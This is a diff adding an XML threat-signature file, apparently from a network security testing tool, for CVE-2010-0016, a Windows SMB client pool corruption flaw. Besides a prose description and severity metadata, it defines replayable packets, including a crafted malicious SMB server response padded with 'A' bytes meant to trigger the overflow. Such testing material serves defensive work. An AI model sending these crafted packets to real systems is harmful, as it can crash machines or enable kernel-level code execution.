@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows SMB Client Pool Corruption"/>
+    <EngDesc display="true" value="A remote code execution vulnerability has been reported in Microsoft Windows SMB Client. The vulnerability is due to lack of boundary checks when handling SMB responses. Remote attackers could exploit this vulnerability by enticing a user to connect to a malicious SMB server that sends specially crafted SMB responses to the target machine. Successful exploitation would allow for arbitrary code injection and execution with the privileges of the operating system kernel (Ring 0). Code injection that does not result in execution could crash the target system, and result in a Denial of Service condition."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="SMB"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows_SMB_Client"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000/Microsoft_Windows_XP/Microsoft_Windows_Server_2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0016"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="2ca7bc36a5a314ca5ec70b07c170538c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634027904667979594"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1267180210" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+    <for index="F">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:C6:0F:88" destMac="00:0C:29:2A:16:23" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00B1" Identification="0016" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9127" srcIP="172.16.8.38" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1031" destPort="$SMBdestPort" SeqNumber="4EA2E2D0" AckNumber="AB37F22B" HeaderLength="05" WindowSize="FAF0" Checksum="AE77" UrgentPointer="0000" Options="" Payload="00000085FF534D4272000000001853C80000000000000000000000000000FFFE00000000006200025043204E4554574F524B2050524F4752414D20312E3000024C414E4D414E312E30000257696E646F777320666F7220576F726B67726F75707320332E316100024C4D312E325830303200024C414E4D414E322E3100024E54204C4D20302E313200" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:2A:16:23" destMac="00:0C:29:C6:0F:88" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00AB" Identification="C30F" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="0E34" srcIP="$destIP" destIP="172.16.8.38" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$SMBdestPort" destPort="1031" SeqNumber="AB37F22B" AckNumber="4EA2E359" HeaderLength="05" WindowSize="1920" Checksum="3E4B" UrgentPointer="0000" Options="" Payload="0000007FFF534D4272000000009853C80000000000000000000000000000FFFE000000001105000232000100000000000000010000000000FCE30180EAB26E181162CA012A03003A0041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
